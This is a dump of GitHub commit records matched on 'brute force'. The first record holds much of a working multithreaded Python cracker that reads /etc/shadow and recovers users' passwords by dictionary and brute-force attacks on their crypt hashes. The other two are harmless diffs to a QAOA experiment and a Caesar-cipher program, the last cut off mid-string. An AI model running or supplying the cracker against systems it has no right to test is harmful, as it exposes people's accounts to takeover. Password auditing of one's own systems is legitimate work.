_calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck):\n    global dictionary_total_thread_time\n    total_time = (time.process_time() - s_time)\n    total_thread_time_lck.acquire()\n    dictionary_total_thread_time += total_time\n    total_thread_time_lck.release()\n    print(f\"[+] [Thread {thread_id}] Time: {total_time} seconds\")\n\n\ndef _calculate_pw_dictionary_thread_time(s_time, thread_id, total_thread_time_lck):\n    global dictionary_total_thread_time\n    total_time = (time.process_time() - s_time)\n    total_thread_time_lck.acquire()\n    dictionary_total_thread_time += total_time\n    total_thread_time_lck.release()\n    print(f\"[+] [PW Thread {thread_id}] Time: {total_time} seconds\")\n\n\ndef _check_args(opts):\n    if len(opts) == ZERO:\n        sys.exit(\"[+] NO_ARG_ERROR: No arguments were passed in!\")\n\n\ndef _check_if_files_exists(file_dir, pw_list_dir):\n    try:\n        if not os.path.exists(file_dir):\n            sys.exit(f\"[+] ERROR: {file_dir} Doesn't Exist or Invalid Argument!\")\n        elif not os.path.exists(pw_list_dir) or pw_list_dir == \"\":\n            print(f\"[+] ERROR: Password File Doesn't Exist or Invalid Argument!\")\n        else:\n            print(f\"[+] Now reading the {file_dir} file...\")\n    except FileNotFoundError:\n        sys.exit(\"[+] ERROR: File Doesn't Exist!\")\n\n\ndef check_if_root_user():\n    if not os.geteuid() == 0:\n        sys.exit(\"[+] ERROR: Only the 'root' user can run this script \"\n                 \"[Please run this script again using sudo command].\")\n\n\ndef _check_user_parameters(user_list):\n    if len(user_list) == ZERO:\n        sys.exit(\"[+] No users were passed in as arguments!\")\n\n\ndef _check_valid_user(file_entry, user_name, user_list):\n    if '$' not in file_entry and len(user_list) >= TWO:\n        print(f\"[+] INVALID USER: {user_name} is a service, utility, or process and cannot be cracked!\")\n        print(\"[+] Now moving on to the next user...\")\n        return False\n    elif '$' not in file_entry and len(user_list) < TWO:\n        print(f\"[+] INVALID USER: {user_name} is a service, utility, or process and cannot be cracked!\")\n        return False\n    else:\n        return True\n\n\ndef _create_dictionary_thread_pool():\n    with ThreadPoolExecutor() as executor:\n        for i in range(num_of_threads):\n            _execute_dictionary_threads(executor, i)\n\n\ndef dictionary_attack_helper(input_hash, input_salt, max_attempt, pw_deque: deque,\n                             list_lock: threading.Lock, attempt_lock: threading.Lock,\n                             pw_stop_q: queue.Queue, thread_id: int):\n    # Start Local timer\n    s_time = time.process_time()\n\n    # Initialize variables\n    global total_attempts, dictionary_thread_total_attempts, dictionary_total_thread_time, total_thread_time_lck\n    attempt = ZERO\n    thread_id += 1\n\n    # If no max number of attempts set in command args (-a)\n    if max_attempt == ZERO:\n        if pw_deque is not None:\n            while len(pw_deque) is not ZERO:\n                list_lock.acquire()\n                pw = str(pw_deque.popleft()).strip()\n                list_lock.release()\n\n                if crypt.crypt(pw, input_salt) == input_hash:\n                    # Calculate Time\n                    _calculate_pw_dictionary_thread_time(s_time, thread_id, total_thread_time_lck)\n\n                    print(f\"[+] [PW Thread {thread_id}] CRACK COMPLETE: Password has been found!\")\n                    print(f\"[+] [PW Thread {thread_id}] Number of Attempts Made: {attempt}\")\n\n                    # Erase all pw in deque to stop all concurrent threads\n                    list_lock.acquire()\n                    pw_deque.clear()\n                    list_lock.release()\n\n                    # Put password in stop_queue\n                    pw_lck.acquire()\n                    pw_stop_q.put(pw)\n                    pw_lck.release()\n\n                    # Update total attempts global\n                    attempt_lock.acquire()\n                    dictionary_thread_total_attempts += attempt\n                    total_attempts += attempt\n                    attempt_lock.release()\n\n                    return pw\n                else:\n                    attempt += 1\n\n            # If no password is found in dictionary\n            attempt_lock.acquire()\n            dictionary_thread_total_attempts += attempt\n            total_attempts += attempt\n            attempt_lock.release()\n\n            _calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck)\n\n            if pw_stop_q.empty():\n                pw_stop_q.put(None)\n                return\n    else:\n        if pw_deque is not None:\n            while len(pw_deque) is not ZERO:\n                list_lock.acquire()\n                pw = str(pw_deque.popleft()).strip()\n                list_lock.release()\n\n                if crypt.crypt(pw, input_salt) == input_hash:\n                    # Calculate Time\n                    _calculate_pw_dictionary_thread_time(s_time, thread_id, total_thread_time_lck)\n\n                    print(f\"[+] [PW Thread {thread_id}] CRACK COMPLETE: Password has been found!\")\n                    print(f\"[+] [PW Thread {thread_id}] Number of Attempts Made: {attempt}\")\n\n                    # Erase all pw in deque to stop all concurrent threads\n                    list_lock.acquire()\n                    pw_deque.clear()\n                    list_lock.release()\n\n                    # Put password in stop_queue\n                    pw_lck.acquire()\n                    pw_stop_q.put(pw)\n                    pw_lck.release()\n\n                    # Update total attempts global\n                    attempt_lock.acquire()\n                    dictionary_thread_total_attempts += attempt\n                    total_attempts += attempt\n                    attempt_lock.release()\n\n                    return pw\n                elif attempt == max_attempt:\n                    _calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck)\n\n                    print(f\"[+] [Thread {thread_id}] CRACK FAILED: Max attempts of {attempt} has been reached!\")\n\n                    attempt_lock.acquire()\n                    dictionary_thread_total_attempts += attempt\n                    total_attempts += attempt\n                    attempt_lock.release()\n\n                    pw_stop_q.put(None)\n                    return\n                else:\n                    attempt += 1\n\n            # If no password is found in dictionary\n            attempt_lock.acquire()\n            dictionary_thread_total_attempts += attempt\n            total_attempts += attempt\n            attempt_lock.release()\n\n            _calculate_dictionary_thread_time(s_time, thread_id, total_thread_time_lck)\n\n            if pw_stop_q.empty():\n                pw_stop_q.put(None)\n                return\n\n\ndef dictionary_atk_results_check():\n    global password, num_of_threads\n\n    while pw_queue.qsize() != num_of_threads:\n        break\n\n    pw_queue_list = []\n\n    for m in range(pw_queue.qsize()):\n        pw_queue_list.append(pw_queue.get())\n\n    for item in pw_queue_list:\n        if item is not None:\n            password = item\n\n\ndef _execute_dictionary_threads(executor, i):\n    executor.submit(dictionary_attack_helper, user_hash, salt, max_attempts, pw_deque,\n                    list_lock=pw_list_lock, attempt_lock=total_attempt_lock,\n                    pw_stop_q=pw_queue, thread_id=i)\n\n\ndef _ioerror_handler(file_directory):\n    if file_directory == \"\":\n        print(\"[+] IOError: No password file has been specified in command args!\")\n    else:\n        print(f\"[+] IOError: Cannot open the following password file: {file_directory}!\")\n\n\ndef display_welcome_msg():\n    print(WELCOME_MSG)\n    print(WELCOME_DECORATION)\n    print(f\"[+] CPU Info: {cpuinfo.get_cpu_info()['brand_raw']}\")\n    print(f\"[+] Number of Cores Available: {multiprocessing.cpu_count()}\")\n\n\ndef init_variables():\n    brute_force_attempts = ZERO\n    brute_force_flag = False\n    thread_total_attempts = ZERO\n    total_brute_force_attempts = ZERO\n    total_attempts = ZERO\n    total_attempt_lock = threading.Lock()\n    total_thread_time = ZERO\n    total_thread_time_lck = threading.Lock()\n    brute_force_counter_lock = threading.Lock()\n    brute_force_counter = ZERO\n    password = \"\"\n    start_time = ZERO\n    stop_time = ZERO\n    total_time = ZERO\n    pw_list_lock = threading.Lock()\n    pw_queue = queue.Queue()\n    pw_lck = threading.Lock()\n    bf_pw_deque = deque()\n    bf_total_time_queue = queue.Queue()\n    bf_total_attempt_queue = queue.Queue()\n    bf_total_thread_time = ZERO\n    bf_total_thread_attempts = ZERO\n\n    return total_attempts, brute_force_attempts, total_brute_force_attempts, thread_total_attempts, brute_force_flag, \\\n        start_time, stop_time, total_time, password, pw_list_lock, total_attempt_lock, pw_queue, pw_lck, \\\n        total_thread_time, total_thread_time_lck, brute_force_counter_lock, brute_force_counter, bf_pw_deque,\\\n        bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts\n\n\ndef make_pw_deque(pw_list_dir):\n    global brute_force_flag\n\n    if pw_list_dir == \"\":\n        brute_force_flag = True\n\n    pw_q = deque()\n\n    try:\n        password_file = open(pw_list_dir, 'r')\n        for line in password_file:\n            pw_q.append(line.strip())\n    except IOError:\n        _ioerror_handler(pw_list_dir)\n        brute_force_flag = True\n\n    return pw_q\n\n\ndef open_shadow_file(file_dir):\n    try:\n        file = open(file_dir, 'r')\n        return file\n    except IOError:\n        if file_dir == \"\":\n            sys.exit(\"[+] IOError: The '\/etc\/shadow' file is not specified in command args!\")\n        else:\n            sys.exit(f\"[+] IOError: Cannot open the following file: {file_dir}\")\n\n\ndef parse_arguments():\n    cleansed_user_list_args = []\n    file_directory = \"\"\n    password_list = \"\"\n    num_of_threads = multiprocessing.cpu_count()\n    max_attempts = ZERO\n\n    # Remove file name from argument list\n    arguments = sys.argv[1:]\n\n    # Getting the file directory from (-f flag) and users (as args)\n    opts, user_list_args = getopt.getopt(arguments, 'f:l:a:t:')\n\n    # Check if empty parameters\n    _check_args(opts)\n\n    # Check if users are passed in\n    _check_user_parameters(user_list_args)\n\n    # Parsing command-line args\n    for opt, argument in opts:\n        if opt == '-f':\n            file_directory = argument\n        if opt == '-l':\n            password_list = argument\n        if opt == '-t':\n            try:\n                if int(argument) < ZERO:\n                    print(\"[+] ERROR: Number of threads (-t) cannot be negative integer!\")\n                elif int(argument) > multiprocessing.cpu_count():\n                    print(f\"[+] ERROR: Number of threads (-t) cannot be greater than the \"\n                          f\"max number of cores: {multiprocessing.cpu_count()}\")\n                else:\n                    num_of_threads = int(argument)\n            except ValueError:\n                sys.exit(f\"[+] Must be an integer for -t option!\")\n        if opt == '-a':\n            try:\n                max_attempts = int(argument)\n                print(f\"[+] MAX ATTEMPTS for each algorithm: {max_attempts}\")\n            except ValueError:\n                sys.exit(f\"[+] Invalid Argument for -a option!\")\n\n    # Check number of threads (if default)\n    if num_of_threads == multiprocessing.cpu_count():\n        print(f\"[+] [DEFAULT] Program is now creating and using {num_of_threads} threads...\")\n    else:\n        print(f\"[+] [CUSTOM] Program is now creating and using {num_of_threads} threads...\")\n\n    # Check for duplicate users in arguments (prevent cracking duplicate users)\n    cleansed_user_list_args = _remove_duplicate_users(cleansed_user_list_args, user_list_args)\n\n    return file_directory, cleansed_user_list_args, password_list, max_attempts, num_of_threads\n\n\ndef print_end():\n    print(f\"\\n{WELCOME_DECORATION}\")\n    print(PROGRAM_TERMINATE_MSG_1)\n    print(f\"[+] Total Number of Attempts: {total_attempts + total_brute_force_attempts}\")\n    print(f\"[+] Total Time Elapsed: {round(total_time, 2)} seconds\")\n    print(PROGRAM_TERMINATE_MSG_2)\n\n\ndef _print_results(elapsed_time, d_thread_attempts, d_thread_time):\n    if d_thread_attempts != ZERO and d_thread_time != ZERO:\n        print(f\"[+] Total Thread Attempts (Dictionary Attack): {d_thread_attempts}\")\n        print(f\"[+] Total Thread Time: {round(d_thread_time, 3)} seconds\")\n\n    print(f\"[+] Time elapsed: {elapsed_time} seconds\")\n\n\ndef process_statistics(pw):\n    global stop_time, total_time, dictionary_thread_total_attempts, dictionary_total_thread_time\n\n    stop_time = time.process_time()\n    _print_results(round(stop_time - start_time, 2), dictionary_thread_total_attempts, dictionary_total_thread_time)\n    total_time += (stop_time - start_time)\n\n    if pw != \"\":\n        print(f\"[+] The password is {pw}\")\n\n\ndef _remove_duplicate_users(cleansed_user_list_args, orig_user_list_args):\n    for user in orig_user_list_args:\n        if user not in cleansed_user_list_args:\n            cleansed_user_list_args.append(user)\n\n    print(f\"[+] The following users are to have their passwords cracked: {cleansed_user_list_args}\")\n    return cleansed_user_list_args\n\n\ndef remove_user_from_list(user_list):\n    return user_list[1:]\n\n\ndef reset_variables():\n    global start_time, password, dictionary_thread_total_attempts, \\\n        dictionary_total_thread_time, brute_force_counter, pw_deque, \\\n        bf_pw_deque, bf_total_time_queue, bf_total_attempt_queue, bf_total_thread_time\n\n    start_time = time.process_time()\n    password = None\n    shadow_file.seek(BACK_TO_START)\n    dictionary_thread_total_attempts = ZERO\n    dictionary_total_thread_time = ZERO\n    brute_force_counter = ZERO\n    bf_total_thread_time = ZERO\n    pw_deque = backup_deque.copy()\n    pw_queue.empty()\n    bf_pw_deque.clear()\n    bf_total_time_queue.empty()\n    bf_total_attempt_queue.empty()\n\n\ndef user_not_found_check(user_info, user_list, user_name, file_dir):\n    if len(user_info) is ZERO and len(user_list) >= TWO:\n        print(f\"\\n[+] ERROR: {user_name} has not been found in {file_dir}! \"\n              f\"Now moving on to the next user...\\n\")\n        return True\n    elif len(selected_user_info) is ZERO and len(user_list) < TWO:\n        print(f\"\\n[+] ERROR: The last user: '{user_name}' has not been found in {file_dir}!\")\n        return True\n\n\ndef init_bf_variables():\n    start_index_list = create_char_chunk_index_list(num_of_threads)\n    bf_pw_lock = threading.Lock()\n    bf_total_time_lock = threading.Lock()\n    bf_total_attempt_lock = threading.Lock()\n\n    return start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock\n\n\ndef bf_pw_results_check():\n    global password, bf_pw_deque, num_of_threads\n\n    while len(bf_pw_deque) != num_of_threads:\n        break\n\n    for item in bf_pw_deque:\n        if item is not None:\n            password = item\n\n\n# Main Program\nif __name__ == \"__main__\":\n    # Declare Variables\n    total_attempts, brute_force_attempts, total_brute_force_attempts, dictionary_thread_total_attempts, \\\n        brute_force_flag, start_time, stop_time, total_time, password, pw_list_lock, \\\n        total_attempt_lock, pw_queue, pw_lck, dictionary_total_thread_time, total_thread_time_lck,\\\n        brute_force_counter_lock, brute_force_counter, bf_pw_deque, bf_total_time_queue, \\\n        bf_total_attempt_queue, bf_total_thread_time, bf_total_thread_attempts = init_variables()\n\n    # Initialize Program\n    display_welcome_msg()\n    # check_if_root_user()\n    file_directory, user_list_args, password_list_dir, max_attempts, num_of_threads = parse_arguments()\n    _check_if_files_exists(file_directory, password_list_dir)\n\n    # Make a deque of dictionary words (password list)\n    pw_deque = make_pw_deque(password_list_dir)\n    backup_deque = pw_deque.copy()\n\n    # Read contents of the \/etc\/shadow\n    shadow_file = open_shadow_file(file_directory)\n\n    # Check if users exist and handle each\n    for user in user_list_args:\n        selected_user_info = \"\"\n        reset_variables()\n\n        for entry in shadow_file:\n            if user == entry.split(':')[0]:\n                print(f\"\\n[+] {user} has been found! Now attempting to determine a suitable hashing algorithm...\")\n                selected_user_info = entry.split('$')\n\n                # Check if user is valid (and not a service\/process\/utility)\n                if _check_valid_user(entry, user, user_list_args) is False:\n                    break\n\n                # Determine the type of algorithm for user and extract salt\n                algorithm = Algorithms.Algorithm()\n                if algorithm.algorithm_checker(selected_user_info) == Algorithms.Algorithm.ERROR_CODE:\n                    _algorithm_not_found()\n                    break\n\n                print(DICTIONARY_ATK_MSG)\n\n                # Retrieve the Hash\n                user_hash = entry.split(':')[1]\n\n                # Retrieve the salt\n                salt = algorithm.extract_salt(selected_user_info[1], entry)\n\n                # a) ATTACK 1 - Dictionary Attack (multi-thread)\n                if not brute_force_flag:\n                    async_dictionary_attack()\n                    dictionary_atk_results_check()\n\n                # b) ATTACK 2 - Use Brute-Force if dictionary fails or Password File is not valid\n                if (password is None) or (password is BRUTE_FORCE_LAUNCH):\n                    print(BRUTE_FORCE_ATK_MSG)\n                    start_index_list, bf_pw_lock, bf_total_time_lock, bf_total_attempt_lock = init_bf_variables()\n\n                    with ThreadPoolExecutor() as executor:\n                        thread_id = 1\n                        for index in range(len(start_index_list)):\n                            executor.submit(brute_force_multithread, salt, user_hash, max_attempts, thread_id,\n                                            start_index_list[index], bf_pw_deque, bf_total_time_queue,\n                                            bf_total_attempt_queue, bf_pw_lock, bf_total_time_lock,\n                                            bf_total_attempt_lock)\n                            thread_id += 1\n\n                    # WHILE LOOP for password\n                    bf_pw_results_check()\n\n                    # WHILE LOOP (TIME) to wait for length of time queue to be equal to total number of threads\n                    while bf_total_time_queue.qsize() != num_of_threads:\n                        break\n\n                    for i in range(bf_total_time_queue.qsize()):\n                        bf_total_thread_time += bf_total_time_queue.get()\n\n                    print(f\"[+] Total Thread Time (Brute Force): {bf_total_thread_time} seconds\")\n\n                    # WHILE LOOP (ATTEMPTS) to wait for total number of attempts to be equal total num of threads\n                    while bf_total_attempt_queue.qsize() != num_of_threads:\n                        break\n\n                    for i in range(bf_total_attempt_queue.qsize()):\n                        bf_total_thread_attempts += bf_total_attempt_queue.get()\n\n                    total_brute_force_attempts += bf_total_thread_attempts\n                    print(f\"[+] Total Number of Attempts For All Threads (Brute Force): {bf_total_thread_attempts}\")\n\n        if user_not_found_check(selected_user_info, user_list_args, user, file_directory):\n            pass\n        else:\n            process_statistics(password)\n\n        user_list_args = remove_user_from_list(user_list_args)\n\n    # Program Terminate\n    print_end()\n"}},"msg":"Changed Brute Force to multi-processing"}},"https:\/\/github.com\/zentas\/qaoa":{"e17ae3543b86289d2b37f1655befde567ba59a38":{"url":"https:\/\/api.github.com\/repos\/zentas\/qaoa\/commits\/e17ae3543b86289d2b37f1655befde567ba59a38","html_url":"https:\/\/github.com\/zentas\/qaoa\/commit\/e17ae3543b86289d2b37f1655befde567ba59a38","message":"slite changes in brute force","sha":"e17ae3543b86289d2b37f1655befde567ba59a38","keyword":"brute force change","diff":"diff --git a\/experiment.py b\/experiment.py\nindex bd2f036..7a8924e 100644\n--- a\/experiment.py\n+++ b\/experiment.py\n@@ -37,11 +37,11 @@ def __init__(self, p, dim, method, create_backend, fixed_seed=None):\n \n     def brute_force(self, model):\n         def number2array(x):\n-            return [x \/\/ 2 ** (i - 1) % 2 for i in range(self.dim, 0, -1)]\n+            return [x for x in list(format(x, 'b').rjust(self.dim, '0'))]\n \n         costs = [\n             (\n-                \"\".join([str(n) for n in number2array(x)]),\n+                \"\".join(number2array(x)),\n                 objective_function(number2array(x), model),\n             )\n             for x in range(2**self.dim)\n","files":{"\/experiment.py":{"changes":[{"diff":"\n \n     def brute_force(self, model):\n         def number2array(x):\n-            return [x \/\/ 2 ** (i - 1) % 2 for i in range(self.dim, 0, -1)]\n+            return [x for x in list(format(x, 'b').rjust(self.dim, '0'))]\n \n         costs = [\n             (\n-                \"\".join([str(n) for n in number2array(x)]),\n+                \"\".join(number2array(x)),\n                 objective_function(number2array(x), model),\n             )\n             for x in range(2**self.dim)\n","add":2,"remove":2,"filename":"\/experiment.py","badparts":["            return [x \/\/ 2 ** (i - 1) % 2 for i in range(self.dim, 0, -1)]","                \"\".join([str(n) for n in number2array(x)]),"],"goodparts":["            return [x for x in list(format(x, 'b').rjust(self.dim, '0'))]","                \"\".join(number2array(x)),"]}],"source":"\nimport numpy as np from scipy.optimize import minimize from qiskit import QuantumCircuit import tqdm import utils import generate_random_matrix as grm def compute_expectation(counts, model): avg=0 sum_count=0 for bitstring, count in counts.items(): obj=objective_function(bitstring, model) avg +=obj * count sum_count +=count return avg \/ sum_count def objective_function(x, model): x=[int(bit) for bit in x] return model.decode_sample(x, vartype=\"BINARY\").energy class Experiment: def __init__(self, p, dim, method, create_backend, fixed_seed=None): self.p=p self.dim=dim self.create_backend=create_backend self.fixed_seed=fixed_seed self.method=method self.shots=512 def brute_force(self, model): def number2array(x): return[x \/\/ 2 **(i -1) % 2 for i in range(self.dim, 0, -1)] costs=[ ( \"\".join([str(n) for n in number2array(x)]), objective_function(number2array(x), model), ) for x in range(2**self.dim) ] return dict(costs) def create_qaoa_circ(self, model, theta): nqubits=self.dim c=model.to_ising(index_label=True) p=len(theta) \/\/ 2 qc=QuantumCircuit(nqubits) beta=theta[:p] gamma=theta[p:] for i in range(0, nqubits): qc.h(i) for irep in range(0, p): for(i, j) in c[1]: qc.rzz(2 * c[1][i, j] * gamma[irep], i, j) for i in c[0]: qc.rz(-2 * c[0][i] * gamma[irep], i) for i in range(0, nqubits): qc.rx(2 * beta[irep], i) return qc def mesure_circ(self, qc): qc.measure_all() return qc def get_expectation_function(self, model): backend=self.create_backend() backend.shots=self.shots def execute_circ(theta): qc=self.mesure_circ(self.create_qaoa_circ(model, theta)) counts=( backend.run(qc, seed_simulator=self.fixed_seed, nshots=self.shots) .result() .get_counts() ) return compute_expectation(utils.invert_counts(counts), model) return execute_circ def generate_model(self, dens): return grm.model_from_matrix(grm.random_normal_matrix(self.dim, dens).A) def generate_close_matricies(self, N, center_point, radius, dens): return[ center_point +radius * grm.random_normal_matrix(self.dim, dens) for _ in range(N) ] def generate_and_solve(self, dens): model=self.generate_model(dens) return self.solve(model) def solve(self, model, callback=None): method, options=self.method f=self.get_expectation_function(model) init=np.ones(shape=(2 * self.p,)) return minimize(f, init, method=method, options=options, callback=callback) def validate(self, item, brute_solution): minval=min(brute_solution.values()) res=[k for k, v in brute_solution.items() if v==minval] return item in res def solve_and_record_pathing(self, model): route, function_route=[],[] expectation_function=self.get_expectation_function(model) def record_path_callback(x): route.append(x) function_route.append(expectation_function(x)) res=self.solve(model, callback=record_path_callback) return res.x, route, function_route, res.fun def retrieve_state_distribution(self, model, theta): backend=self.create_backend() backend.shots=self.shots qc=self.mesure_circ(self.create_qaoa_circ(model, theta)) res=backend.run(qc, seed_simulator=self.fixed_seed).result().get_counts() counts=utils.invert_counts(res) item, score=sorted(counts.items(), key=lambda x: x[1])[-1] return counts,(item, score) def compute_probability_distribution( self, models_and_brute_solutions, probability_retrieval ): res=[] for model, brute_solution in tqdm.tqdm(models_and_brute_solutions): solution=self.solve(model) final_theta=solution.x counts,(item, _)=self.retrieve_state_distribution(model, final_theta) res.append(probability_retrieval(counts, brute_solution, item)) return[prob for prob in res if prob is not None] def compute_probability_avg( self, models_and_brute_solutions, probability_retrieval ): res=self.compute_probability_distribution( models_and_brute_solutions, probability_retrieval ) return sum(res) \/ len(res) def validate_fixed_prop(self, prob, dens): n=0 solved=0 while True: model=self.generate_model(dens=dens) solution=self.solve(model) final_theta=solution.x _,(item, _)=self.retrieve_state_distribution(model, final_theta) brute_solution=self.brute_force(model) if self.validate(item, brute_solution): solved +=1 n +=1 if solved \/ n > prob: break return n def retrieve_probabilities1(counts, brute_results, *args): minval=min(brute_results.values()) res=[k for k, v in brute_results.items() if v==minval] if len(res)==1: return counts.get(res[0], 0) \/ sum(counts.values()) else: return None def retrieve_probabilities2(counts, brute_results, *args): item, *_=args minval=min(brute_results.values()) res=[k for k, v in brute_results.items() if v==minval] if len(res)==1 and item in res: return counts.get(res[0], 0) \/ sum(counts.values()) else: return None def retrieve_probabilities3(counts, brute_results, *args): minval=min(brute_results.values()) res=[k for k, v in brute_results.items() if v==minval] c=0 for r in res: c +=counts.get(r, 0) return c \/ sum(counts.values()) ","sourceWithComments":"import numpy as np\n\nfrom scipy.optimize import minimize\n\nfrom qiskit import QuantumCircuit\n\nimport tqdm\n\nimport utils\nimport generate_random_matrix as grm\n\n\ndef compute_expectation(counts, model):\n    avg = 0\n    sum_count = 0\n    for bitstring, count in counts.items():\n        obj = objective_function(bitstring, model)\n        avg += obj * count\n        sum_count += count\n\n    return avg \/ sum_count\n\n\ndef objective_function(x, model):\n    x = [int(bit) for bit in x]\n    return model.decode_sample(x, vartype=\"BINARY\").energy\n\n\nclass Experiment:\n    def __init__(self, p, dim, method, create_backend, fixed_seed=None):\n        self.p = p\n        self.dim = dim\n        self.create_backend = create_backend\n        self.fixed_seed = fixed_seed\n        self.method = method\n        self.shots = 512\n\n    def brute_force(self, model):\n        def number2array(x):\n            return [x \/\/ 2 ** (i - 1) % 2 for i in range(self.dim, 0, -1)]\n\n        costs = [\n            (\n                \"\".join([str(n) for n in number2array(x)]),\n                objective_function(number2array(x), model),\n            )\n            for x in range(2**self.dim)\n        ]\n        return dict(costs)\n\n    def create_qaoa_circ(self, model, theta):\n        nqubits = self.dim\n        c = model.to_ising(index_label=True)\n        p = len(theta) \/\/ 2  # number of alternating unitaries\n        qc = QuantumCircuit(nqubits)\n\n        beta = theta[:p]\n        gamma = theta[p:]\n\n        # initial_state\n        for i in range(0, nqubits):\n            qc.h(i)\n\n        for irep in range(0, p):\n            # problem unitary: gamma\n            # note: C is used here\n            for (i, j) in c[1]:\n                qc.rzz(2 * c[1][i, j] * gamma[irep], i, j)\n            for i in c[0]:\n                qc.rz(-2 * c[0][i] * gamma[irep], i)\n\n            # mixer unitary: beta\n            for i in range(0, nqubits):\n                qc.rx(2 * beta[irep], i)\n\n        return qc\n\n    def mesure_circ(self, qc):\n        qc.measure_all()\n        return qc\n\n    def get_expectation_function(self, model):\n        backend = self.create_backend()\n        backend.shots = self.shots\n\n        def execute_circ(theta):\n            qc = self.mesure_circ(self.create_qaoa_circ(model, theta))\n            counts = (\n                backend.run(qc, seed_simulator=self.fixed_seed, nshots=self.shots)\n                .result()\n                .get_counts()\n            )\n\n            return compute_expectation(utils.invert_counts(counts), model)\n\n        return execute_circ\n\n    def generate_model(self, dens):\n        return grm.model_from_matrix(grm.random_normal_matrix(self.dim, dens).A)\n\n    def generate_close_matricies(self, N, center_point, radius, dens):\n        return [\n            center_point + radius * grm.random_normal_matrix(self.dim, dens)\n            for _ in range(N)\n        ]\n\n    def generate_and_solve(self, dens):\n        model = self.generate_model(dens)\n        return self.solve(model)\n\n    def solve(self, model, callback=None):\n        method, options = self.method\n\n        f = self.get_expectation_function(model)\n        init = np.ones(shape=(2 * self.p,))\n        return minimize(f, init, method=method, options=options, callback=callback)\n\n    def validate(self, item, brute_solution):\n        minval = min(brute_solution.values())\n        res = [k for k, v in brute_solution.items() if v == minval]\n        return item in res\n\n    def solve_and_record_pathing(self, model):\n        route, function_route = [], []\n\n        expectation_function = self.get_expectation_function(model)\n\n        def record_path_callback(x):\n            route.append(x)\n            function_route.append(expectation_function(x))\n\n        res = self.solve(model, callback=record_path_callback)\n\n        return res.x, route, function_route, res.fun\n\n    def retrieve_state_distribution(self, model, theta):\n        backend = self.create_backend()\n        backend.shots = self.shots\n\n        qc = self.mesure_circ(self.create_qaoa_circ(model, theta))\n        res = backend.run(qc, seed_simulator=self.fixed_seed).result().get_counts()\n        counts = utils.invert_counts(res)\n        item, score = sorted(counts.items(), key=lambda x: x[1])[-1]\n\n        return counts, (item, score)\n\n    def compute_probability_distribution(\n        self, models_and_brute_solutions, probability_retrieval\n    ):\n        res = []\n        for model, brute_solution in tqdm.tqdm(models_and_brute_solutions):\n            solution = self.solve(model)\n            final_theta = solution.x\n            counts, (item, _) = self.retrieve_state_distribution(model, final_theta)\n            res.append(probability_retrieval(counts, brute_solution, item))\n        return [prob for prob in res if prob is not None]\n\n    def compute_probability_avg(\n        self, models_and_brute_solutions, probability_retrieval\n    ):\n        res = self.compute_probability_distribution(\n            models_and_brute_solutions, probability_retrieval\n        )\n        return sum(res) \/ len(res)\n\n    def validate_fixed_prop(self, prob, dens):\n        n = 0\n        solved = 0\n        while True:\n            model = self.generate_model(dens=dens)\n\n            solution = self.solve(model)\n            final_theta = solution.x\n            _, (item, _) = self.retrieve_state_distribution(model, final_theta)\n\n            brute_solution = self.brute_force(model)\n            if self.validate(item, brute_solution):\n                solved += 1\n            n += 1\n            if solved \/ n > prob:\n                break\n\n        return n\n\n\n# --- end of class Experiment\n\n\ndef retrieve_probabilities1(counts, brute_results, *args):\n    minval = min(brute_results.values())\n    res = [k for k, v in brute_results.items() if v == minval]\n    if len(res) == 1:\n        return counts.get(res[0], 0) \/ sum(counts.values())\n    else:\n        return None\n\n\ndef retrieve_probabilities2(counts, brute_results, *args):\n    item, *_ = args\n    minval = min(brute_results.values())\n    res = [k for k, v in brute_results.items() if v == minval]\n    if len(res) == 1 and item in res:\n        return counts.get(res[0], 0) \/ sum(counts.values())\n    else:\n        return None\n\n\ndef retrieve_probabilities3(counts, brute_results, *args):\n    minval = min(brute_results.values())\n    res = [k for k, v in brute_results.items() if v == minval]\n    c = 0\n    for r in res:\n        c += counts.get(r, 0)\n    return c \/ sum(counts.values())\n"}},"msg":"slite changes in brute force"}},"https:\/\/github.com\/dnahng\/numtheory-cipher":{"bc04e8f322388aea3298683cc1e8cce2220ad3c8":{"url":"https:\/\/api.github.com\/repos\/dnahng\/numtheory-cipher\/commits\/bc04e8f322388aea3298683cc1e8cce2220ad3c8","html_url":"https:\/\/github.com\/dnahng\/numtheory-cipher\/commit\/bc04e8f322388aea3298683cc1e8cce2220ad3c8","message":"changes and working na ung brute force","sha":"bc04e8f322388aea3298683cc1e8cce2220ad3c8","keyword":"brute force change","diff":"diff --git a\/main.py b\/main.py\nindex ec5b9c6..7298707 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -28,6 +28,14 @@ def decryption(text, key):\n     return result.upper()\n \n \n+def bruteforce(text, possible_keys=26):\n+    \"\"\"Print possible plaintext for the provided ciphertext.\"\"\"\n+    for possible_key in range(1, possible_keys):\n+        possible_text = decryption(text, possible_key)\n+        print(f\"Key #: {possible_key} - Plain text: {possible_text}\")\n+\n+\n+\n # MENU FUNCTIONS\n def mainMenu():\n     try:\n@@ -39,7 +47,7 @@ def mainMenu():\n         print(\"\"\"=== Caesar Cipher Program by Group 2 AN41 ===\n             1 - Encryption\n             2 - Decryption\n-            3 - Brute Force (No key needed)\n+            3 - Decrypt using Brute Force (No key needed)\n             4 - Exit Program\"\"\")\n \n         choice = int(input(\"What would you like to do?: \"))\n@@ -48,7 +56,7 @@ def mainMenu():\n         elif choice == 2:\n             decMenu()\n         elif choice == 3:\n-            'BLANK MUNA'\n+            bfMenu()\n         elif choice == 4:\n             quit()\n         else:\n@@ -56,6 +64,7 @@ def mainMenu():\n     except:\n         print('Invalid Input...')\n \n+\n def encMenu():\n     print(\"\"\"\\n=== Caesar Cipher: ENCRYPTION ===\\n\"\"\")\n     try:\n@@ -68,6 +77,7 @@ def encMenu():\n     except:\n         print(\"Invalid Input, try again...\")\n \n+\n def decMenu():\n     print(\"\"\"\\n=== Caesar Cipher: DECRYPTION ===\\n\"\"\")\n     try:\n@@ -81,10 +91,19 @@ def decMenu():\n         print(\"Invalid Input, try again...\")\n \n \n+def bfMenu():\n+    print(\"\"\"\\n=== Caesar Cipher: BRUTE FORCE ===\"\"\")\n+    print(\"Test all possible shift keys 26-letter alphabet A-Z\\n\")\n+    try:\n+        txt = input(\"Please enter the message you want to decrypt: \")\n+        bruteforce(txt)\n+    except:\n+        print(\"Invalid Input, try 